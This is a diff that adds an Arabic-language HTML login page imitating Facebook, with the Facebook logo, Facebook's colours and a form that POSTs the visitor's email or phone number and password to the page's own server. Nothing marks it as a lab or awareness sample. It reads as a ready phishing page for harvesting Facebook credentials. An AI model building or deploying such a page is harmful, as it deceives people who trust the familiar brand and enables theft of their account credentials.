@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<title>تسجيل الدخول إلى فيسبوك</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+  body {
+    margin: 0;
+    background-color: #ffffff; /* خلفية بيضاء */
+    font-family: 'Roboto', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  .container {
+    background-color: #fff;
+    padding: 40px 50px;
+    border-radius: 10px;
+    box-shadow: 0 8px 24px rgb(0 0 0 / 0.15);
+    width: 350px;
+    text-align: center;
+  }
+
+  .logo {
+    margin-bottom: 30px;
+  }
+
+  .logo img {
+    width: 160px;
+    height: auto;
+  }
+
+  h2 {
+    margin: 0 0 25px 0;
+    font-weight: 600;
+    font-size: 24px;
+    color: #1877f2; /* لون نص فيسبوك */
+  }
+
+  input[type="email"], input[type="password"] {
+    width: 100%;
+    padding: 14px 15px;
+    margin-bottom: 20px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    font-size: 15px;
+    box-sizing: border-box;
+    direction: ltr;
+  }
+
+  button {
+    width: 100%;
+    background-color: #1877f2;
+    color: white;
+    border: none;
+    padding: 14px 0;
+    border-radius: 6px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+  }
+
+  button:hover {
+    background-color: #165cdb;
+  }
+
+  ::placeholder {
+    color: #90949c;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="Facebook Logo" />
+    </div>
+    <h2>تسجيل الدخول إلى فيسبوك</h2>
+    <form method="POST">
+      <input type="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
+      <input type="password" name="password" placeholder="كلمة المرور" required />
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+  </div>
+</body>
+</html>
+
+
